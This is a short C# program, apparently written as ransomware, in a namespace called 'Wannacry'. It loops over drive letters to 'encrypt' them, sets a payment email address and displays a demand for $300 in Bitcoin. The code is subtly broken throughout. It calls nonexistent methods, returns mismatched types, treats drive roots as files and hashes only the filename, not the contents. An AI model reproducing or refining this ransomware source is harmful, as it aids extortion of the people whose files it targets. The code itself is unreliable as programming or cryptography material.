using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Authentication;
using System.Security.Principal;
using System.Web;

namespace Wannacry
{
 class Program
 {
 static void Main(string[] args)
 {
 // Set up the target files for encryption
 string[] targetFiles = new string[5] {"c:", "d:", "e:", "f:", "g:"};
 Console.WriteLine("Encrypting files...");
 foreach (string file in targetFiles)
 {
 FileInfo fi = new FileInfo(file);
 if (!fi.Exists) continue;
 string originalName = fi.Name;
 string encryptedName = originalName + ".encrypted";
 EncryptionHelper.EncryptFile(fi, encryptedName, "123456");
 Console.WriteLine($"Original file: {originalName}");
 Console.WriteLine($"Encrypted file: {encryptedName}");
 }
 // Set up the payment address for ransom money
 string paymentAddress = "geniuswang2234@gmail.com";
 // Set up the message to display to victims
 string messageToDisplay = "Your files have been encrypted. Pay 300$ in 
Bitcoins to unlock them.";
 // Display the ransomware screen and wait for a response
 Console.WriteLine(messageToDisplay);
 Console.ReadLine();
 }
 }
 class EncryptionHelper
 {
 public static void EncryptFile(FileInfo fi, string encryptedName, string 
key)
 {
 // Create a new file with the encrypted name
 FileStream fs = new FileStream(encryptedName, FileMode.Create);
 // Encode the encrypted filename into binary format for encryption
 byte[] encryptedFilename = Convert.ToByteArray(encryptedName, 
Encoding.UTF8);
 // Compute the sha256 hash of the filename and encrypt it with the key
 byte[] encodedHash = EncryptSHA256(key, encryptedFilename);
 // Write the encrypted file to disk
 fs.Write(encodedHash, 0, encodedHash.Length);
 // Close the stream and return a success message
 Console.WriteLine("Encrypted successfully.");
 }
 public static byte[] SHA256Hash(string data)
 {
 using (var sha256 = new SHA256Managed())
 {
 var hashData = sha256.ComputeHash(Encoding.UTF8.GetBytes(data));
 return hashData;
 }
 }
 public static byte[] EncryptSHA256(string key, byte[] data)
 {
 using (var encoder = new HMACSHA256(Convert.FromBase64String(key)))
 {
 var encryptedData = Convert.ToBase64String(encoder.ComputeHash(data));
 return encryptedData;
 }
 }
 }
}
